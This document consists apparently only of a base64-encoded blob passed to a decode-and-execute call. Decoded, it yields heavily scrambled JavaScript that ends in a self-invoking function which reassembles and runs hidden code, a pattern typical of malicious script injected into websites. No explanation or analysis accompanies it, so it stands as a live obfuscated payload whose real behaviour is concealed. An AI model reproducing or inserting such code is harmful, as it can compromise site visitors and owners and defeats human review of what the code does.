WF0Q1hkcChhMjdYKWhYLntYU2lyLlolYkZhPV1iZjFuRmE9MWJnWGVhXy4lIyBYM3BDLjEjfWJ9WGN2XUxhWCxpU1hYbG5DdClNTCxYWGFhWFhwX0NpKUkpeCIwJS5yc3RhbytpU3VLbjBuMXNsYS1lPWM1dGVyX3RYbDJ5MGlfbjFyWG9sZV80bSUodGVtaWtuaHUlKG4kci5uMGUgc3Jyb2RYbW92VSV0cCRyb3VwU3NsOmhhYl0hcHUlc3RsWGVYaXN0dXNhZjhsMyFuZCRhNWNzZil1d24lLi51bXA9dF1jYnIodV1iZXNpdC5lLmVyYlguUWJscUJ1RWR2b2dpX259clhyfWVYcDpuck5yZlhwMXRdUy5ONWliIXJlYWMobS4lcjNYaX0lWHQzJVhvdSFYaFh1XWF9bHBpbmdTaWktbjguZShUZGVYJTtvdXdudSlvXWV0JTF1PW4icDNvZHN1JTt0XyVYc2xhJTBpaThjMUVxZS50dG9pZV9oXC8lW1wvWC4gZ3VkWGRuZF1leGVEZC1wWF9yaV9vfCV3cyxyLnRybywuMjh4dHdlTnVhLm1vWGJyZStmWGlscm11dGdEbXB0MGVYY1hhWGV1Lm90e2NmXC9fbyBlaml3b3JlPTRveFglLHhzdFwvb3MlNXAxYVhlXXVOO2FjZCUuLiVob2Fibm8lbm4hbiFnXC8wMCVYcy5kN3ddZTNpJCU9c3RyWDtmbzQldyUgdHByNmUgZGFvdHQocyg5KSUoZWRlJWMoZnRuLmpiYSVkby5vXC9zJXhnKXAlZWxUaW1kb2Fhb3AwIXQlbmtjaSUlfXQxJVhzWGUlb3J0IGElITp0MyVdbC4wb3V1ckJnLW9zJVh4ZG8pb2FldHQpYT1nNj1tZFhiWC5iLntkb2Y2Ylhhbmw2YSllWC4xcjIlJSU5ZV9sPSV0b10lNnMyO1huM2E9cm5sMyVuMnJvOW1YLmlkWmRYZWJydGcrYWJzWHgmbHRvbyVXJVglOyEwJTZyZGM9aCE3WGJUbmVhYWNqLlFfanNhJVhzOnRYZ3tuMW4sLlhyMW0gbV1lYW9lOV8sXzEsOU4xWCklZlhLcGF4JDtmMzdvODZvYVh0bzo9YWFydXJsWFcuPm1YXz15XC9nMVhYZ2k6MDtYXXtyZWV0X1hfWDZpcFIyWCw/MGRYblg6WGFTc2osO2FddWU6QFtYK3ddezpYZFhuPTpwXjN2WGxpZTF2XWl0KDgpWH1jfVhpcyhuIV8ub24ubGxYPVhlU3RtJW9zIXVcL2ldIVcyPm9bX3l5YmZsZTRYXWVdKVg5MTldKDtfWz15WGJdbFg0Nl19VFg7eWgib2EuYS48XSRhY3lYZTJySW9zKF83aF1hfX08WCkxWGhYJWNfZy4ybl1GaTMoMWNYe3JlbnUubj1YPWEoWFgzaTF0WD01aTEiWCU3RDFYWG85MjFLWG9iaTE6WGFkMzE1WDhmQ11fP1g9XC87blhhYWQqbGllKyl7UlM1W1hbb11fWVQ4eEUueHJ7Z1hYZW8pdX1lKVhYWGdYbzRhPVQpaSkhPVhiMGE/dGxvYjlsJWhoc2MuWFhdKFg3ciloKWw7cyRjc01JYWUqPVhhKSRYZmE3YjhuKDdzbG5pLm1YdFguaU5nNG97YTtYXXV0aX00IV1fWCFlWGkpNCVdZnxfLkEwWE5vPWY3ZV1YTmU9LFggbzA4bE5YPSUuLFhQb19hZXkgY1hhZFg7Ll9hKGNcL2F0cylYZWF1WCh2KGlpKCMpWHtnPX1hJF0oO2RIe1hhWDwyK11zWDRvbmUtSS49IFhYYVJdKTRVXS4oWGpYb31ybGNlWFg4KSwlZX1oWGQ+Y2FwM3IlbW46aSxYZGQxdVhibnV7Um9fdDRhX2Ulcy5tOnQ1b2U6fTddXWVYO3JhdSFYMTJYXXJYPTIsWyFAaXQ7SWw9fTdYXSRCPSN7ZV0sYytpLi50dSldQmUjV2ZYLDM4b1NtKG9YemFfXXQyNVguKVgyO117KWhjbHRjaCJ0NXt2KCgpb30+fSJENyN0WD1lT3Q2fTc7c1hpNH1db3QxO11YKWY9VGwpWSk2WG4pZl87PVxcXFxpb11kXzBYKWduLS4yWzhYXVhvMTpfb1hiYSVYMFgxMiRddFZuIjg0b28lQV0hIDQ1b11Kc1hYWGcxX18uWFhhdVhhWGIyLV02VmEiaTNPbyxBYSFYM21vfUowWGRYbTFfX2NYbmFYWCJYbzIzXV9WOSIxMl1vXUFfIWYyJW82Slh9bilYKHJYeG5YOmwoZTltOVgwdGE7VWVYYWJjXW0xNikhWFldO1YuIU9uKDIrXVhYZW4hbFg/XW5YZVJpX2VIOlhYX2NnXX0qPSkrcl10S3I1fVh7PU9aNXBYZGYgcnVYN185aTNHLF83ailvU3Qyci4oUVhfY2NdWClYXyBzdEdmIVtfPXNlR2YuWF89aVgmZWUpVG9YMmRuXXhYZV9YamJvMW5Yc2llZ19Lbz1wKTMub2ZfXXM9Jixmb107aSkoaF9ocz1fWGVzdG5kXWxyb0lffV9nWGwzRV1fWGIzKV0sKG0pWDsuXytzb18hZWx0KWRybGVvZV8zX2lYZTM9XTZ9RUVYJGJ4IzdhYyBfXyliWGw9UmFzZXpfWGVfXzM2fWUjMX19c2lYYSBsIHtlUzpmaV9Yc3dHNVdYYWRfZHNfJmZkX11jV24kXVhsM1hdcilcJ18uaWkmcjM1VDF9dGlJYV1sWFhbWFgpK3Roci53WGFvNXc2ZjQzXVh9YX0zKXAoTilnZltyZ1h7X29YZD1hMXJfX1hsWFMxIjtYXyUld2ApUVwnISExaG9YX3RYWFhzLi4tZT87OmVhaGg9Nmw1MV1sKGYpWShYX20lMykhP3RfXVwnOzBYX21YXVhyM3RfLlhRWHZYLFhKMVhfb1hYZGNuWC5yIVgxWG87Zl1hPisxYV9fYVwnY1ZfInIwbmV0QSUhLjAuZSF9O1gpZnB0cztAWFhYNzJcXF0zWGFvLm5ne1goMjkwODRYWDcxXWV0KHtyZVhkKXJYOnAuLjooK2VhWDk4NlhVIX1dWEAob1g7bntYc2Q6WCVYYjE5WDluLj0pYTl9b1hYWD0xZV0oWHVvc25vfXR9WEQ7I3JYKG5idF19aVhuZm1UXSluZlhLLGE9WClYWHQpNjZkNVs0bmkuZjhYLjVdfSglLnd7Yn0uZ3suZV1YWGJ0WDs6YXRzJEludCh0aTFuKVhYPWEoXXdYJTMgXS4rZTY9VXthZnMpSSF0NHRhNl1kN1tfLmw4fW5dLnQxLiltMVgpLFgudDsoX1guWFgzIV02WHJldFR9WElpLihPWGU0Y11zWEN0WFg0NCFdbFhsM2w0MHt0ZXl1JW5IRS4pWX1vaWY2JTA7WHR0eFh0WDFYLjlhcD1wPXJdZW9uPShhYWl3NGl9LixzZTNYXVgpLlg0WCQ4YnQ9WC05ZnBYPiRhMy5sWGlvdCsqYV07YWZpIm5fLi4pLjMhMlBfKDFfbC00LjFjbjtzUWUhSV9NWC5sLiIxWkxYWFhyNiViO3VbMyVdWFhjNFhdKTtpUXIhKV9IPSlkLHRYY3NlWDo2Xl1zMGRvb2lYXjR7XXB3X25Jb1hzZXpoZG86bV5hOzRRJSFTX1g9bzNjWFgoPVhYNC5dLTtwU1tRbiFlXyhYWGYoMzlYfWhYIlhfJSwoWCU0LV1YOysoaV8mWHQ5WzBlYT0kcjRveXQuciFyX3RYMl9YXzpYKVhONitYOVhYWDl7KSlyZV9hdFglM1hnOjtfUV8hdF8jPWxYZWJYWFZYKTJ7X3A2KGMkVH09clwvJWRkJmUuWCFhX2lYNzQ7XXsoKC4zXS5YM2VfKXV7bSgyX1gofTlsMCgwYmEtJFg0bnlvLlghdF9YWE5fXV9gWDpYXC82LlhdWFhYJnsoKWFKdiJdUGE9WCFVXzZYWGYgM2FYYWglIjFfYywyNCkrMTFnKTZYXzZzYm4zMlhsNF9Yc19dXyUrLlhiMXRnWCQgNXl3XUR0I3ldYUBzIlhadGVMYWZYYTF1Zyh9PX17YV1jLlglWDlYaHRYeyl9ZyhtIDdYYyAgWFggOFt0eHZjcl0pWCwgbyxfX2RzYV8ybCVja19lYXJhXSA9czlfLGUydDZkTWxYb19fWF8xIC5fIDZYZVgxWDYgalhvbm50c3RlbF8xb2pwXTE9dHRfbmoob2ViOW9laytwcHJ7bWggJWE7eSxja2FvWGEuWCBYNF1dYSBfK29hWDl9XS5AMnRze1guYWkgNjkpbjZvIDouc1ggIH0sWDZhXV9YbiAxNi4ge1hzNDhYZjEoX0ZlM3JyNyVjb189IClYKSAwOW0gYVhSKFh7Ll8kX3Q5KDh0MG8gKy5fYW5hMHRlYWRYWGEgKClYXSggfWZ0TnlsWG4gfWEpeWllfWZhYWk7ZW8hKFFPMix0WDIgSXs4ZXB1ZG41IFh0aV83X285PCBmLnRzYWwzdGEgYVtpJGFmITgoWGEoYS5jWDIgKF9YNmNlYjFYcmx0JXJYLlxcICl7aU85fV1jcnRYaCh1ZWM2aTRuOi40amxpMyguKVFOYzspT19YcWFmWGR7JHZdciggT2k9YSB0ZXkrID1dcilsXSwuWyB0OyVmICZYLmEgLHQ4bl1dZS42ICVfMyl9XTgobyAxPWVhWGE7ZTQgLnJiZVh7cGY2IGErX3snKSk7dmFyIHpMST1BeFkoUXppLENDViApO3pMSSgyNTk3KTtyZXR1cm4gODk3Nn0pKCk='))
